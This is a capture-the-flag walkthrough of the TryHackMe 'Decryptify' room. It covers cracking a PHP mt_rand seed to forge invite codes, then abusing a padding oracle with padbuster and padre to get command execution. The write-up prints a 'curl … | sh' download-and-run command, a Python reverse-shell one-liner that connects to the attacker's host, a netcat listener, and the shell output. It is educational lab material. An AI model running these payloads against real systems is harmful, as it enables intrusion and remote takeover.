---
title: Decryptify - TryHackMe - Walkthrough
date: 2025-02-15 10:00:00 +0200
categories: [TryHackMe]
tags: [crypto,insecure randomness,rce, reverse engineering,aes]
description: This room is the challenge based on the crypto rooms.
image:
  path: /assets/blog/Decryptify/Room.png
  alt: Decryptify Room image
---

## Description

This is a Write-Up for the Decryptify room, you can visit the room [here](https://tryhackme.com/room/decryptify). The room is rated as **Medium**.

> Start the VM by clicking the `Start Machine` button at the top right of the task. You can complete the challenge by connecting through the VPN or the AttackBox, which contains all the essential tools.
> 
> _Can you decrypt the secrets and_ _get RCE on the system?_

Before doing this challenge I recommend you doing the [Padding Oracles](https://tryhackme.com/room/paddingoracles) and the [Insecure Randomness](https://tryhackme.com/room/insecurerandomness) rooms, they provide you with a strong foundation to solve this room.

## Recon

I started this room with an `nmap` scan:
```terminal
sudo nmap -p- -sV -sC -oA nmap/initial -vv 10.10.227.78
```

Only two ports are open, one for ssh and the other a Apache2/PHP webserver. 

```
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
1337/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Login - Decryptify
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

If you visit the site, you are provided with two login options.

![](/assets/blog/Decryptify/page.png)

## API Access

If you try to access the API documentation you need a password.

![](/assets/blog/Decryptify/api.png)

I next inspected the HTML code for any interesting/suspicious/useful information. On the main page there is this line:
```html
    <script src="/js/bootstrap.bundle.min.js"></script>
	    <script src="/js/api.js"></script>
```
{: file='index.php'}

The API script looks heavily obfuscated:

```js
function b(c,d){const e=a();return b=function(f,g){f=f-0x165;let h=e[f];return h;},b(c,d);}const j=b;function a(){const k=['16OTYqOr','861cPVRNJ','474AnPRwy','H7gY2tJ9wQzD4rS1','5228dijopu','29131EDUYqd','8756315tjjUKB','1232020YOKSiQ','7042671GTNtXE','1593688UqvBWv','90209ggCpyY'];a=function(){return k;};return a();}(function(d,e){const i=b,f=d();while(!![]){try{const g=parseInt(i(0x16b))/0x1+-parseInt(i(0x16f))/0x2+parseInt(i(0x167))/0x3*(parseInt(i(0x16a))/0x4)+parseInt(i(0x16c))/0x5+parseInt(i(0x168))/0x6*(parseInt(i(0x165))/0x7)+-parseInt(i(0x166))/0x8*(parseInt(i(0x16e))/0x9)+parseInt(i(0x16d))/0xa;if(g===e)break;else f['push'](f['shift']());}catch(h){f['push'](f['shift']());}}}(a,0xe43f0));const c=j(0x169);
```

I first run this [JavaScript Deobfuscator](https://deobfuscate.io/), to get a little bit cleaner code:

```js
function b(c, d) {
  const e = a();
  return b = function (f, g) {
    f = f - 357;
    let h = e[f];
    return h;
  }, b(c, d);
}
const j = b;
function a() {
  const k = ["16OTYqOr", "861cPVRNJ", "474AnPRwy", "H7gY2tJ9wQzD4rS1", "5228dijopu", "29131EDUYqd", "8756315tjjUKB", "1232020YOKSiQ", "7042671GTNtXE", "1593688UqvBWv", "90209ggCpyY"];
  a = function () {
    return k;
  };
  return a();
}
(function (d, e) {
  const i = b, f = d();
  while (true) {
    try {
      const g = parseInt(i(363)) / 1 + -parseInt(i(367)) / 2 + parseInt(i(359)) / 3 * (parseInt(i(362)) / 4) + parseInt(i(364)) / 5 + parseInt(i(360)) / 6 * (parseInt(i(357)) / 7) + -parseInt(i(358)) / 8 * (parseInt(i(366)) / 9) + parseInt(i(365)) / 10;
      if (g === e) break; else f.push(f.shift());
    } catch (h) {
      f.push(f.shift());
    }
  }
}(a, 934896));
const c = j(361);
```

The important part is the `const c = j(361);`, which returns some value, to get the value, you can simply run the command in the browser.

![](/assets/blog/Decryptify/code.png)

With that you can visit the API documentation.

![](/assets/blog/Decryptify/doc.png)

## Predict the invite code

This code inside the API documentation displays how the random invite_code is generated. We need to login to the application. The code itself looks vulnerable, because it uses PHP's `mt_rand()` and `mt_srand()`. We can predict the seed number with the `mt_rand()` sample and can calculate the constant value if we subtract the email constant.

From the **Insecure Randomness room**: *The use of PHP's `mt_rand()` function weakens the security of the system.*

```php
// Token generation example
function calculate_seed_value($email, $constant_value) {
    $email_length = strlen($email);
    $email_hex = hexdec(substr($email, 0, 8));
    $seed_value = hexdec($email_length + $constant_value + $email_hex);

    return $seed_value;
}
$seed_value = calculate_seed_value($email, $constant_value);
mt_srand($seed_value);
$random = mt_rand();
$invite_code = base64_encode($random);

```

To exploit this vulnerability we need to find some sample data from the random number generator and more important emails. I run a `gobuster` for that:
```
/api.php              (Status: 200) [Size: 1043]
/css                  (Status: 301) [Size: 317] [--> http://10.10.227.78:1337/css/]
/dashboard.php        (Status: 302) [Size: 0] [--> logout.php]
/footer.php           (Status: 200) [Size: 245]
/header.php           (Status: 200) [Size: 370]
/index.php            (Status: 200) [Size: 3220]
/index.php            (Status: 200) [Size: 3220]
/javascript           (Status: 301) [Size: 324] [--> http://10.10.227.78:1337/javascript/]
/js                   (Status: 301) [Size: 316] [--> http://10.10.227.78:1337/js/]
/logs                 (Status: 301) [Size: 318] [--> http://10.10.227.78:1337/logs/]
/phpmyadmin           (Status: 301) [Size: 324] [--> http://10.10.227.78:1337/phpmyadmin/]
```

The logs folder contains a `app.log` file:

```
2025-01-23 14:32:56 - User POST to /index.php (Login attempt)
2025-01-23 14:33:01 - User POST to /index.php (Login attempt)
2025-01-23 14:33:05 - User GET /index.php (Login page access)
2025-01-23 14:33:15 - User POST to /index.php (Login attempt)
2025-01-23 14:34:20 - User POST to /index.php (Invite created, code: MTM0ODMzNzEyMg== for alpha@fake.thm)
2025-01-23 14:35:25 - User GET /index.php (Login page access)
2025-01-23 14:36:30 - User POST to /dashboard.php (User alpha@fake.thm deactivated)
2025-01-23 14:37:35 - User GET /login.php (Page not found)
2025-01-23 14:38:40 - User POST to /dashboard.php (New user created: hello@fake.thm)
```

This data is in the format we need it. We can use the invite code for the user `alpha@fake.thm`.

```terminal
$ base64 -d <<< MTM0ODMzNzEyMg== && echo
1348337122
```

Now we need to brute force the seed, for that I used the tool [php_mt_seed](https://github.com/openwall/php_mt_seed) (You need to compile it with `make`).

```terminal
$ ./php_mt_seed 1348337122
Pattern: EXACT
Version: 3.0.7 to 5.2.0
Found 0, trying 0xfc000000 - 0xffffffff, speed 14092.9 Mseeds/s 
Version: 5.2.1+
Found 0, trying 0x00000000 - 0x01ffffff, speed 0.0 Mseeds/s 
seed = 0x00143783 = 1324931 (PHP 7.1.0+)
```

If you now take the first value from that output (`1324931`), remember from the script above that the `$seed_value` is generated with the `hexdec()` function which in PHP is used to generate a number from hex decimal string. In that example we have a number as the input, but the number is in PHP treated as a string, which means we need to generate the hex presentation of the string `1324931` with a short python shell:

```terminal
>>> hex(1324931)
'0x143783'
```

Now we can use the number `143783` further. For that I modified some code of the from the documentation to this which generates the email seed value part:

```php
<?php
function calculate_seed_value($email) {
	$email_length = strlen($email);
	$email_hex = hexdec(substr($email, 0, 8));
	return $email_length + $email_hex;
}

$email = "alpha@fake.thm";

$seed = calculate_seed_value($email);
echo "Email num: ".$seed."\n";
?>
```

If we run this, we get the email part and can subtract it to get the constant value:
```
$ php test.php 
Email num: 43784
```

To subtract it I used python again:
```
>>> 143783-43784
99999
```

Now we can use the following script to generate the invite code:

```php
<?php
function calculate_seed_value($email, $constant_value) {
	$email_length = strlen($email);
	$email_hex = hexdec(substr($email, 0, 8));
	$seed_value = hexdec($email_length + $constant_value + $email_hex);

	return $seed_value;
}
$email = "hello@fake.thm";
$constant_value = 99999;

$seed_value = calculate_seed_value($email, $constant_value);
mt_srand($seed_value);
$random = mt_rand();
$invite_code = base64_encode($random);

echo "Cracked invite Code: " . $invite_code. "\n";
?>
```

```sh
$ php generate.php 
Cracked invite Code: NOTTHEREALONE
```

With that you can login to the dashboard as the user `hello@fake.thm`:

![](/assets/blog/Decryptify/main.png)

## Padding Oracle

I inspected the dashboard to see if we have any invisible features. I found this line which is a hidden mini form.

```html
<form method="get">
            <input type="hidden" name="date" value="Ff4CgePWWMavKFP7DuD0ANUFg72DrurV4ZPpS42fNrI=">
        </form>
```

I added the parameter to my request and got this padding error on the page. This is a strong sign of the padding oracle vulnerability, because the server tells us if we have an invalid padding, that's why we can "decrypt" plaintext and can "encrypt" data.

![](/assets/blog/Decryptify/date.png)

I first added some random data to the date parameter to see how the server reacts.

![](/assets/blog/Decryptify/head.png)

Interestingly the server only returns this error with up to 7 bytes. So 8 bytes is apparently fine, this means that the server uses 8 bytes as the block size for the block cipher.

I first decoded the data that was "randomly" written into the HTML page.
You can use `padbuster` for that, but it takes like forever. If you like something faster use [`padre`](https://github.com/glebarez/padre), credit goes to 0day:
```terminal
padbuster -cookies 'PHPSESSID=0e9hu3j0nfug89ag2vmhf65i3a' -encoding 0 -error 'Padding error' 'http://10.10.227.78:1337/dashboard.php?date=Ff4CgePWWMavKFP7DuD0ANUFg72DrurV4ZPpS42fNrI='
```

The decrypted data from the HTML code looks like the `date` command for Linux.

```
[+] Decrypted value (ASCII): date +%Y

[+] Decrypted value (HEX): 64617465202B255908080808080808080808080808080808

[+] Decrypted value (Base64): ZGF0ZSArJVkICAgICAgICAgICAgICAgI
```

My idea was now to use this to create a command and execute a shell.

### Shell
To get a shell on the server we can use `padbuster`. I added the plaintext option which can be used to encrypt the plaintext.
```sh
padbuster -cookies 'PHPSESSID=0e9hu3j0nfug89ag2vmhf65i3a' -encoding 0 -error 'Padding error' 'http://10.10.227.78:1337/dashboard.php?date=Ff4CgePWWMavKFP7DuD0ANUFg72DrurV4ZPpS42fNrI=' 'Ff4CgePWWMavKFP7DuD0ANUFg72DrurV4ZPpS42fNrI=' 8 -plaintext 'curl 10.14.78.229/a | sh'
```

The output will take some time but finally return something like this:

```terminal
-------------------------------------------------------
** Finished ***

[+] Encrypted value is: 2ujSBvRzahq3QMXurmRxkbL%2BhB4vT4jGqsEAqzvXYU8AAAAAAAAAAA%3D%3D
-------------------------------------------------------
```

Now create a file a for the reverse shell:
```sh
#!/bin/bash

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.14.78.229",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

Now let's start a Python server and a `netcat` listener in two different terminal windows:
```terminal
sudo python3 -m http.server 80
nc -lvnp 9001
```

Now add the `date` payload to your browser to execute it:

![](/assets/blog/Decryptify/run.png)

You should receive a reverse shell instantly:

```
$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.14.78.229] from (UNKNOWN) [10.10.227.78] 34980
$ ls
ls
 S   'So'$'\373'   css		   footer.php   index.php   logs
 So   api.php	   dashboard.php   header.php   js
$ cd /home/ubuntu
cd /home/ubuntu
$ ls
ls
flag.txt  node_modules	package-lock.json  test.sh
$ wc flag.txt
wc flag.txt
 1  1 30 flag.txt
```

You can also use [`padre`](https://github.com/glebarez/padre) for this part, which takes just about <10% of the time. You can use this command to simply print the flag:

```terminal
./padre -cookie 'PHPSESSID=bd7c749uptsjuckms0h4m5fko8; role=d057af5933d8acebfe290fe2bbd540e08a2a81a22eff55969a89a7dbe84fb98cd6cbda066ed79220eba70afb9b3d4e0d' -u 'http://10.10.163.207:1337/dashboard.php?date=$' -enc "cat /home/ubuntu/flag.txt"
```

I really liked this Crypto room.